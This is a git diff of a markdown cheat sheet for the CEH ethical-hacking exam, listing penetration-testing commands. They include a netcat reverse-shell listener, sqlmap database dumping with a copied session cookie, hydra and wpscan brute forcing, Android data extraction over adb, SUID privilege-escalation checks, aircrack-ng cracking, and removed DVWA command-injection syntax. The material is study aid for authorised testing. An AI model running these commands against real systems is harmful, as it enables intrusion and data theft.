@@ -1,4 +1,4 @@
-# CEHCheat Sheet
+# CEH Cheet Sheet
 
 
 ---
@@ -10,121 +10,93 @@
     `Certutil.exe -Urlcache -f http://<ParrotIP>/eg.jpg C:\path\to\save\file\eg.jpg`
 *   **Linux Download (wget):**  
     `wget http://<Windows_IP>:8080/eg.jpg -O eg.jpg`
+*   **Netcat Listener (Reverse Shell):**  
+    `nc -lnvp 1234` (Listens on port 1234 for incoming connections)
 
 ---
 
 ## 🔍 2. Enumeration & File Discovery
-### Finding Files in Linux
+### Finding Files & Sorting
 *   **Visual Tree:** `tree` (Works on Windows & Linux)
 *   **Find all .txt:** `sudo find / -name *.txt`
-*   **Find specific name:** `sudo find / -name SpecificFileName.txt`
-*   **Search in directory:** `sudo find /DirectoryName -name SpecificFileName.txt`
 *   **Search current path:** `sudo find . -name SpecificFileName.txt`
+*   **Sort & Unique Passwords:**  
+    `sort filename.txt | uniq > newfile.txt` (Removes duplicates from a wordlist)
 
 ### Infrastructure & Server ID
-*   **Identify Servers:** `nmap -A -oN scans` (Use **mousepad** to search results easily).
+*   **Identify Servers:** `nmap -A -oN scans`
 *   **Domain Controller (DC) Check:** Look for **88/TCP (kerberos-sec)** and **389/TCP (LDAP)**. 
-*   **Aggressive Scan:** Once a DC is found, perform an Aggressive scan for full details.
-*   **Vulnerability Scan:** `nmap -Pn --script vuln <TIP> -T5`
-*   **Web Discovery:** `dirb <targetDomain> -x eg.txt`
-*   **Backup Scanner:** Use **OpenVAS** if Nmap fails.
+*   **Vulnerability Research:** `nmap -Pn --script vuln <TIP> -T5`
+*   **Directory Bruting:** `dirb <targetDomain> -x eg.txt`
 
 ---
 
 ## 📱 3. Mobile & IoT Security
-*   **Port Check:** Check for port **5555** open.
 *   **Connect:** `adb connect <TIP>:5555`
 *   **Data Extraction:** `adb pull sdcard/`
-*   **PhoneSploit:** `python3 phonesploitpro.py`  
-    *(Interactive mode: **N** = Next page, **P** = Previous page)*
+*   **PhoneSploit:** `python3 phonesploitpro.py` (Interactive: **N**=Next, **P**=Previous)
 *   **IoT Analysis:** Use `mqtt` filter in Wireshark for published messages.
 
 ---
 
-## 🕸️ 4. Web, SQLi & CMS
+## 🕸️ 4. Web & SQL Injection
 ### SQLmap Workflow
-1.  **Auth Setup:** View Profile > `document.cookie` in console > Copy value.
+1.  **Auth Setup:** View Profile > `document.cookie` in console.
 2.  **List DBs:** `sqlmap -u <url> --cookie "<value>" --dbs`
-3.  **List Tables:** `sqlmap -u <url> --cookie "<value>" -D dbName --tables`
-4.  **Dump Data:** `sqlmap -u <url> --cookie "<value>" -D dbName -T Users_Login --dump`
+3.  **Dump Data:** `sqlmap -u <url> --cookie "<value>" -D dbName -T Users_Login --dump`
 
 ### WordPress (WPScan)
 *   **Scan URL:** `wpscan -url <domain or ip>`
-*   **Brute Force:** `wpscan -url <domain> -U user -P pass.txt`
-*   **Enum Users:** `wpscan -url <domain> -e u`
-
-### DVWA & Command Execution
-*   **Execution syntax:** `|<commands>`
-*   **Windows Display:** `| type "path"`
-*   **Linux Display:** `| cat "path"`
+*   **Brute Force:** `wpscan -url <domain> -U user -P pass.txt -e u`
 
 ---
 
 ## ☣️ 5. Malware Analysis & Forensics
-### Binary & Static Analysis
-*   **objdump:** `objdump -d <file>` (Disassemble) or `objdump -x <file>` (Headers).
-*   **readpe:** `readpe --all <file.exe>` (Analyze PE headers).
-*   **nm:** `nm -u <file>` (Undefined symbols).
-*   **RAT Access:** **Theef** Tool (`Client210.exe`). Target ports: **9871**, **6703**.
-*   **Entry Points/Linkers:** Use **PEiD** or **PE Explorer**.
+### Static & Binary Analysis
+*   **file:** `file <filename>` (Identify file type/architecture)
+*   **strings:** `strings <filename>` (Extract readable text/hardcoded passwords)
+*   **binwalk:** `binwalk -e <filename>` (Search and extract hidden files/firmware)
+*   **exiftool:** `exiftool <image_file>` (Read metadata like GPS, Author, Software)
+*   **objdump:** `objdump -d <file>` (Disassemble executable sections)
+*   **readpe:** `readpe --all <file.exe>` (Analyze PE headers)
+*   **nm:** `nm -u <file>` (Undefined symbols/external calls)
 *   **Entropy (Packed detection):** 
     *   **DIE (Detect It Easy)** for Windows.
-    *   **ent** for Linux.
+    *   **ent <file>** for Linux (Calculates randomness/entropy).
 
 ### Hashing & Crypto
-*   **Windows Tool:** `HashMyFiles.exe` (Supports multiple files and **crc32**).
-*   **Linux Hashing:** `sha256sum <file>` (or other algorithm prefixes).
-*   **CryptoForge:** Files ending in `.cfe` (Right-click > Decrypt).
-*   **BCTextEncoder:** Use the same tool to decode if used for encryption.
-*   **Base64:**
-    *   `echo "aGVsbG8=" | base64 --decode`
-    *   `base64 -d Sniff.txt > secret.txt`
-
-### Steganography
-*   **Tools:** `OpenStego`, `steghide`.
-*   **Double-Encryption:** Decrypt with password first, then use hash crackers/online tools.
+*   **Hash Multiple Files:** `HashMyFiles.exe` (Windows) or `sha256sum <file>` (Linux).
+*   **Base64:** `echo "aGVsbG8=" | base64 --decode`
+*   **Steganography:** `OpenStego`, `steghide` (Use `steghide extract -sf image.jpg`).
 
 ---
 
 ## 🦈 6. Wireshark & Traffic Analysis
-*   **IP Stats:** `Statistics` -> `IPv4` -> `Source and Destination`.
 *   **Filter SYN (No ACK):** `tcp.flags.syn == 1 && tcp.flags.ack == 0`
 *   **Filter Content:** `frame contains "string"`
 *   **Expert Info:** `Analyze` -> `Expert Info`
-*   **DoS Detection:** Check for high volume targeted at one IP from many sources with no reply.
-*   **DDoS Graphing:** `Statistics` -> `I/O Graph` (Spikes indicate suspicious activity).
+*   **DDoS Detection:** `Statistics` -> `Conversations` (Check for high volume no-reply).
 
 ---
 
 ## 🔑 7. Remote Access & Privilege Escalation
-### Common Ports
-*   **22:** SSH | **23:** Telnet | **3389:** RDP
-
-### SMB
+### SMB & Remote Login
 *   **Check Shares:** `smbmap -H <TIP>` or `smbclient -L <TIP>`
-*   **Access Share:** `smbclient //<TIP>/directory`
-*   **Download File:** `get <FileName>`
 *   **Brute Force:** `hydra -L users.txt -P pass.txt <TIP> smb -f`
-
-### SSH & RDP
-*   **SSH Login:** `ssh user@<IP>`
 *   **RDP Login:** `xfreerdp /v:<TIP> /u:username` or **Remmina**.
 
-### Hydra (General)
-*   **FTP:** `hydra -L users.txt -P passwords.txt ftp://<TIP> -f`
-*   **RDP:** `hydra -L users.txt -P passwords.txt rdp://<TIP> -f`
-*   **SSH (Custom Port):** `hydra -L users.txt -P passwords.txt -s 2222 ssh://<TIP> -f`
-
-### Privilege Escalation
-*   **Root Access:** `sudo -i`
-*   **Reference:** [GTFOBins](https://gtfobins.github.io/)
+### Privilege Escalation (CEH Focus)
+*   **Linux (Sudo):** `sudo -l` (List allowed commands). Check [GTFOBins](https://gtfobins.github.io/).
+*   **Linux (SUID):** `find / -perm -u=s -type f 2>/dev/null` (Find files with root permissions).
+*   **Windows (System Info):** `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
+*   **Windows (Privs):** `whoami /priv` (Look for `SeImpersonatePrivilege`).
+*   **Kernel Exploits:** Use `linux-exploit-suggester.sh` or `windows-exploit-suggester.py`.
 
 ---
 
 ## 🔓 8. Password & Hash Cracking
-*   **Tools:** `hashcat`, `john`, or online crackers.
 *   **.cap Files:** `aircrack-ng -w wordlist.txt capture.cap`
 *   **BSSID Filter:** `aircrack-ng -b <bssid> -w wifiPassList.txt handShakeCapture.cap`
-*   **Find BSSID:** `aircrack-ng <filename>.cap`
+*   **Double-Encryption:** Decrypt with password first, then use hash crackers/online tools.
 
 ---
